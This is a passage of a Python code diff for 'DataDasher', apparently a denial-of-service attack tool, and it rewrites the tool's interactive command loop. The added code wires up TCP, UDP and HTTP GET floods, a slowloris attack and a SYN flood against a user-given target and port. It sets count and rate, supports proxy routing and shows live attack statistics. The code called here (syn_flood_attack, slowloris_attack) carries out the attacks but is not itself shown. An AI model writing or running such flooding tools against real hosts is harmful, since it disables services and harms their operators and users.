-                                i += 2
-                            else:
-                                console.print(f"[red]Error: Unknown option '{args[i]}' for synflood.[/red]")
-                                break
-
+                    if protocol in ("TCP", "UDP", "HTTP GET"):
                         if not validate_ip(target):
                             target_ip = get_target_ip(target)
                             if target_ip is None:
                                 continue
                             target = target_ip
 
-                        syn_flood_attack(target, port, count, rate)
-                    elif cmd == 'exit':
-                        if Confirm.ask("Are you sure you want to exit?"):
-                            console.print("[bold green]Exiting DataDasher. Goodbye![/]")
-                            break
+                        attack_start_time = time.time()
+                        with Live(update_attack_stats("send", 0), refresh_per_second=4) as live:
+                            # Target validation before the attack, with retries
+                            if is_target_responsive(target, port, protocol):
+                                console.print(f"[green]Target {target}:{port} is responsive.[/green]")
+                                for i in range(count):
+                                    if protocol == "TCP":
+                                        if not send_tcp_packet(target, port, payload, custom_headers,
+                                                               proxy_server=proxy_server, proxy_port=proxy_port):
+                                            break
+                                    elif protocol == "UDP":
+                                        if not send_udp_packet(target, port, payload, custom_headers,
+                                                               proxy_server=proxy_server, proxy_port=proxy_port):
+                                            break
+                                    elif protocol == "HTTP GET":
+                                        if not http_get_request(target, custom_headers, proxy_server=proxy_server,
+                                                                proxy_port=proxy_port):
+                                            break
+                                    elapsed_time = time.time() - attack_start_time
+                                    if i % 10 == 0 or i == count - 1:  # Update Live display more frequently
+                                        live.update(update_attack_stats("send", elapsed_time))
+                                    time.sleep(1 / rate)
+                                attack_visualizations(elapsed_time)
+                            else:
+                                console.print(f"[red]Target {target}:{port} is not responsive. Attack aborted.[/red]")
                     else:
                         console.print(
-                            f"[red]Error: Unknown command '{cmd}'. Type 'help' for available commands.[/red]")
-                else:
-                    pass
-            except KeyboardInterrupt:
-                console.print("\n[yellow]Interrupted![/]")
-            except EOFError:
-                console.print("\n[yellow]Exiting...[/]")
-                break
+                            f"[red]Error: Invalid protocol '{protocol}'. Choose from TCP, UDP, or HTTP GET.[/red]"
+                        )
+                elif cmd == 'stats':
+                    statistics_display()
+                elif cmd == 'clear':
+                    console.clear()
+                    display_title()
+                elif cmd == 'help':
+                    if len(args) > 1:
+                        display_help(args[1].lower())
+                    else:
+                        display_help()
+                elif cmd == 'save':
+                    if len(args) < 2:
+                        console.print("[red]Error: Provide a file path to save the configuration.[/red]")
+                        continue
+                    config_file = args[1]
+                    config = {
+                        "default_protocol": protocol,
+                        "default_target": target,
+                        "default_port": port
+                    }
+                    save_config(config, config_file)
+                elif cmd == 'load':
+                    if len(args) < 2:
+                        console.print("[red]Error: Provide a file path to load the configuration.[/red]")
+                        continue
+                    config_file = args[1]
+                    config = load_config(config_file)
+                    if config is None:
+                        continue
+                elif cmd == 'slowloris':
+                    if len(args) < 3:
+                        console.print(
+                            "[red]Error: Invalid usage. Type 'help slowloris' for correct usage.[/red]")
+                        continue
+                    target = args[1]
+                    try:
+                        port = int(args[2])
+                    except ValueError:
+                        console.print("[red]Error: Invalid port number.[/red]")
+                        continue
+                    count = 500
+                    rate = 5
+                    timeout = 60
+                    payload = "GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
+                    proxy_server = None
+                    proxy_port = None
+                    i = 3
+                    while i < len (args):
+                        if args[i] in ("-c", "--count") and i < len(args) - 1:
+                            try:
+                                count = int(args[i + 1])
+                            except ValueError:
+                                console.print("[red]Error: Invalid count value.[/red]")
+                                break
+                            i += 2
+                        elif args[i] in ("-r", "--rate") and i < len(args) - 1:
+                            try:
+                                rate = int(args[i + 1])
+                            except ValueError:
+                                console.print("[red]Error: Invalid rate value.[/red]")
+                                break
+                            i += 2
+                        elif args[i] in ("-t", "--timeout") and i < len(args) - 1:
+                            try:
+                                timeout = int(args[i + 1])
+                            except ValueError:
+                                console.print("[red]Error: Invalid timeout value.[/red]")
+                                break
+                            i += 2
+                        elif args[i] in ("-p", "--payload") and i < len(args) - 1:
+                            payload = args[i + 1]
+                            i += 2
+                        elif args[i] in ('-px', '--proxy') and i < len(args) - 1:
+                            try:
+                                proxy_server, proxy_port = args[i + 1].split(":")
+                                proxy_port = int(proxy_port)
+                                i += 2
+                            except Exception as e:
+                                console.print(f"[red]Error parsing proxy: {e}[/red]")
+                                break
+                        else:
+                            console.print(f"[red]Error: Unknown option '{args[i]}' for slowloris.[/red]")
+                            break
 
+                    if not validate_ip(target):
+                        target_ip = get_target_ip(target)
+                        if target_ip is None:
+                            continue
+                        target = target_ip
+
+                    slowloris_attack(target, port, count, rate, payload, timeout, proxy_server, proxy_port)
+                elif cmd == 'synflood':
+                    if len(args) < 3:
+                        console.print(
+                            "[red]Error: Invalid usage. Type 'help synflood' for correct usage.[/red]")
+                        continue
+                    target = args[1]
+                    try:
+                        port = int(args[2])
+                    except ValueError:
+                        console.print("[red]Error: Invalid port number.[/red]")
+                        continue
+
+                    count = 1000
+                    rate = 100
+                    proxy_server = None
+                    proxy_port = None
+
+                    i = 3
+                    while i < len(args):
+                        if args[i] in ("-c", "--count") and i < len(args) - 1:
+                            try:
+                                count = int(args[i + 1])
+                            except ValueError:
+                                console.print("[red]Error: Invalid count value.[/red]")
+                                break
+                            i += 2
+                        elif args[i] in ("-r", "--rate") and i < len(args) - 1:
+                            try:
+                                rate = int(args[i + 1])
+                            except ValueError:
+                                console.print("[red]Error: Invalid rate value.[/red]")
+                                break
+                            i += 2
+                        elif args[i] in ('-px', '--proxy') and i < len(args) - 1:
+                            try:
+                                proxy_server, proxy_port = args[i + 1].split(":")
+                                proxy_port = int(proxy_port)
+                                i += 2
+                            except Exception as e:
+                                console.print(f"[red]Error parsing proxy: {e}[/red]")
+                                break
+                        else:
+                            console.print(f"[red]Error: Unknown option '{args[i]}' for synflood.[/red]")
+                            break
+
+                    if not validate_ip(target):
+                        target_ip = get_target_ip(target)
+                        if target_ip is None:
+                            continue
+                        target = target_ip
+
+                    syn_flood_attack(target, port, count, rate, proxy_server, proxy_port)
+                elif cmd == 'exit':
+                    if Confirm.ask("Are you sure you want to exit?"):
+                        console.print("[bold green]Exiting DataDasher. Goodbye![/]")
+                        break
+                else:
+                    console.print(
+                        f"[red]Error: Unknown command '{cmd}'. Type 'help' for available commands.[/red]")
+            else:
+                pass
+        except KeyboardInterrupt:
+            console.print("\n[yellow]Interrupted![/]")
+        except EOFError:
+            console.print("\n[yellow]Exiting...[/]")
+            break
+        except Exception as e:
+            console.print(f"[bold red]Fatal Error: {e}[/]")
+            sys.exit(1)
 
 if __name__ == "__main__":
     main()
